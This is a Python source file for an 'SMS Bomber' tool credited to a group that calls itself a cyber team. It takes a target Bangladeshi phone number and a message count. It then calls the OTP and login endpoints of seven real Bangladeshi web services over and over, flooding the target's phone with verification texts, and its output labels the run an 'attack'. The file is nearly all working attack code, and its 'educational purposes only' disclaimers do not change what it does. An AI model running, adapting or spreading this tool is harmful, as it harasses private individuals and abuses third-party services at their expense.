import os
import sys
import time
import requests
from datetime import datetime

# Clear screen
os.system("clear" if os.name == "posix" else "cls")

print("\n\n\n")
name = input(" \033[1;32m Please enter your name: ")

os.system("clear" if os.name == "posix" else "cls")

def style(text):
    """Print text with typing effect"""
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.03)

style("\t\t  Loading.........")
print("\n\n\n")
time.sleep(1.3)
os.system("clear" if os.name == "posix" else "cls")

style("\t\t  Loading successful!")
time.sleep(0.5)
os.system("clear" if os.name == "posix" else "cls")

print("\n\n")
style(f" \033[1;31m Hey \033[1;33m{name}\033[1;31m, Use for ethical purposes only. Coded By CHOWDHURY-VAI CYBER TEAM")

time.sleep(2)
os.system("clear" if os.name == "posix" else "cls")

print(""" \033[1;32m





██████   █████  ██████  ██   ██ ██████   ██████  ███████ ███████  ██ 
██   ██ ██   ██ ██   ██ ██  ██  ██   ██ ██    ██ ██      ██      ███ 
██   ██ ███████ ██████  █████   ██████  ██    ██ ███████ ███████  ██ 
██   ██ ██   ██ ██   ██ ██  ██  ██   ██ ██    ██      ██      ██  ██ 
██████  ██   ██ ██   ██ ██   ██ ██████   ██████  ███████ ███████  ██                                                                                                                                              
    
\033[1;36m =========================================

 Creator    : CHOWDHURY-VAI CYBER TEAM
 Tool Name  : DarkBoss SMS Bomber
 Version    : 2.0 Fixed
 Disclaimer : For Educational Purposes Only
             
=========================================
          
\033[1;0m  
""")

class SMSBomber:
    def __init__(self):
        self.sent_count = 0
        self.failed_count = 0
        self.start_time = None
        
    def show_status(self, service_name, status, response_code=None):
        """Show sending status"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        if status == "success":
            print(f"\033[1;32m[{timestamp}] ✓ {service_name}: Sent successfully (Code: {response_code})")
        elif status == "failed":
            print(f"\033[1;31m[{timestamp}] ✗ {service_name}: Failed (Code: {response_code})")
        else:
            print(f"\033[1;33m[{timestamp}] ⚠ {service_name}: {status}")
    
    def send_rokomari(self, number):
        """Send SMS via Rokomari"""
        try:
            data = {
                'emailOrPhone': number,
                'countryCode': 'BD',
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Referer': 'https://www.rokomari.com',
                'Origin': 'https://www.rokomari.com',
            }
            
            response = requests.post('https://www.rokomari.com/otp/send', 
                                   data=data, 
                                   headers=headers,
                                   timeout=10)
            
            if response.status_code == 200:
                self.sent_count += 1
                self.show_status("Rokomari", "success", response.status_code)
                return True
            else:
                self.failed_count += 1
                self.show_status("Rokomari", "failed", response.status_code)
                return False
                
        except Exception as e:
            self.failed_count += 1
            self.show_status("Rokomari", f"Error: {str(e)[:30]}")
            return False
    
    def send_redx(self, number):
        """Send SMS via Redx"""
        try:
            json_data = {
                'phoneNumber': number,
            }
            
            headers = {
                'User-Agent': 'Mozilla/5.0',
                'Content-Type': 'application/json',
            }
            
            response = requests.post(
                'https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
                json=json_data,
                headers=headers,
                timeout=10
            )
            
            if response.status_code in [200, 201]:
                self.sent_count += 1
                self.show_status("Redx", "success", response.status_code)
                return True
            else:
                self.failed_count += 1
                self.show_status("Redx", "failed", response.status_code)
                return False
                
        except Exception as e:
            self.failed_count += 1
            self.show_status("Redx", f"Error: {str(e)[:30]}")
            return False
    
    def send_bikroy(self, number):
        """Send SMS via Bikroy"""
        try:
            params = {
                'phone': number,
            }
            
            response = requests.get(
                'https://bikroy.com/data/phone_number_login/verifications/phone_login',
                params=params,
                timeout=10
            )
            
            if response.status_code == 200:
                self.sent_count += 1
                self.show_status("Bikroy", "success", response.status_code)
                return True
            else:
                self.failed_count += 1
                self.show_status("Bikroy", "failed", response.status_code)
                return False
                
        except Exception as e:
            self.failed_count += 1
            self.show_status("Bikroy", f"Error: {str(e)[:30]}")
            return False
    
    def send_iqra(self, number):
        """Send SMS via Iqra Live"""
        try:
            response = requests.get(
                f'https://apibeta.iqra-live.com/api/v2/sent-otp/{number}',
                timeout=10
            )
            
            if response.status_code == 200:
                self.sent_count += 1
                self.show_status("Iqra Live", "success", response.status_code)
                return True
            else:
                self.failed_count += 1
                self.show_status("Iqra Live", "failed", response.status_code)
                return False
                
        except Exception as e:
            self.failed_count += 1
            self.show_status("Iqra Live", f"Error: {str(e)[:30]}")
            return False
    
    def send_hoichoi(self, number):
        """Send SMS via Hoichoi"""
        try:
            json_data = {
                'phoneNumber': f'+88{number}',
            }
            
            response = requests.post(
                'https://prod-api.hoichoi.dev/core/api/v1/auth/signinup/code',
                json=json_data,
                timeout=10
            )
            
            if response.status_code in [200, 201]:
                self.sent_count += 1
                self.show_status("Hoichoi", "success", response.status_code)
                return True
            else:
                self.failed_count += 1
                self.show_status("Hoichoi", "failed", response.status_code)
                return False
                
        except Exception as e:
            self.failed_count += 1
            self.show_status("Hoichoi", f"Error: {str(e)[:30]}")
            return False
    
    def send_fundesh(self, number):
        """Send SMS via Fundesh"""
        try:
            json_data = {
                'msisdn': number,
            }
            
            response = requests.post(
                'https://fundesh.com.bd/api/auth/generateOTP',
                json=json_data,
                timeout=10
            )
            
            if response.status_code in [200, 201]:
                self.sent_count += 1
                self.show_status("Fundesh", "success", response.status_code)
                return True
            else:
                self.failed_count += 1
                self.show_status("Fundesh", "failed", response.status_code)
                return False
                
        except Exception as e:
            self.failed_count += 1
            self.show_status("Fundesh", f"Error: {str(e)[:30]}")
            return False
    
    def send_rabbithole(self, number):
        """Send SMS via RabbitHole"""
        try:
            json_data = {
                'mobile': f'+88{number}',
            }
            
            response = requests.post(
                'https://apix.rabbitholebd.com/appv2/login/requestOTP',
                json=json_data,
                timeout=10
            )
            
            if response.status_code in [200, 201]:
                self.sent_count += 1
                self.show_status("RabbitHole", "success", response.status_code)
                return True
            else:
                self.failed_count += 1
                self.show_status("RabbitHole", "failed", response.status_code)
                return False
                
        except Exception as e:
            self.failed_count += 1
            self.show_status("RabbitHole", f"Error: {str(e)[:30]}")
            return False
    
    def run(self):
        """Main function to run the SMS bomber"""
        print("\n\033[1;36m" + "="*50)
        print("          SMS BOMBER - CHOWDHURY-VAI CYBER TEAM")
        print("="*50 + "\033[0m\n")
        
        try:
            # Get user inputs
            target_amount = int(input("Enter total SMS amount to send: "))
            target_number = input("Enter target number (without +88): ").strip()
            
            # Validate number
            if not target_number.isdigit() or len(target_number) != 11:
                print("\033[1;31mError: Please enter a valid 11-digit Bangladeshi number\033[0m")
                return
            
            print(f"\n\033[1;33mTarget: {target_number}")
            print(f"Amount: {target_amount} SMS")
            print("Starting in 3 seconds...\033[0m\n")
            time.sleep(3)
            
            self.start_time = datetime.now()
            
            # List of services
            services = [
                ("Rokomari", self.send_rokomari),
                ("Redx", self.send_redx),
                ("Bikroy", self.send_bikroy),
                ("Iqra Live", self.send_iqra),
                ("Hoichoi", self.send_hoichoi),
                ("Fundesh", self.send_fundesh),
                ("RabbitHole", self.send_rabbithole),
            ]
            
            print("\n\033[1;35m" + "="*50)
            print("          STARTING SMS BOMBING ATTACK")
            print("="*50 + "\033[0m\n")
            
            cycle_count = 0
            
            # Start bombing
            while self.sent_count < target_amount:
                cycle_count += 1
                print(f"\n\033[1;34m[+] Cycle {cycle_count} - Sending SMS batch\033[0m")
                
                # Send from each service
                for service_name, service_func in services:
                    if self.sent_count >= target_amount:
                        break
                    
                    service_func(target_number)
                    time.sleep(1)  # Delay between requests
                
                # Show progress
                print(f"\n\033[1;36m[+] Progress: {self.sent_count}/{target_amount} SMS sent")
                print(f"[+] Failed attempts: {self.failed_count}")
                print(f"[+] Waiting 5 seconds before next cycle...\033[0m\n")
                
                if self.sent_count < target_amount:
                    time.sleep(5)
            
            # Show final results
            self.show_final_report()
            
        except ValueError:
            print("\033[1;31mError: Please enter a valid number for amount\033[0m")
        except KeyboardInterrupt:
            print("\n\n\033[1;33m[!] Process interrupted by user\033[0m")
            self.show_final_report()
        except Exception as e:
            print(f"\033[1;31mUnexpected error: {str(e)}\033[0m")
    
    def show_final_report(self):
        """Show final report"""
        end_time = datetime.now()
        duration = end_time - self.start_time if self.start_time else "N/A"
        
        print("\n" + "="*60)
        print("\033[1;32m" + " " * 15 + "ATTACK COMPLETED SUCCESSFULLY")
        print("\033[1;36m" + "="*60)
        print(f"\033[1;33m[+] Total SMS Sent     : {self.sent_count}")
        print(f"[+] Failed Attempts   : {self.failed_count}")
        print(f"[+] Success Rate      : {self.sent_count/(self.sent_count+self.failed_count)*100:.1f}%")
        print(f"[+] Duration          : {duration}")
        print(f"[+] Branding          : CHOWDHURY-VAI CYBER TEAM")
        print("\033[1;31m[!] Disclaimer: This tool is for educational purposes only.")
        print("    Misuse of this tool is illegal and unethical.\033[0m")
        print("="*60 + "\n")

def main():
    """Main function"""
    # Check internet connection
    try:
        requests.get("https://www.google.com", timeout=5)
    except requests.ConnectionError:
        print("\033[1;31mError: No internet connection. Please check your connection.\033[0m")
        return
    
    # Create and run bomber
    bomber = SMSBomber()
    bomber.run()
    
    # Exit message
    input("\nPress Enter to exit...")

if __name__ == "__main__":
    main()
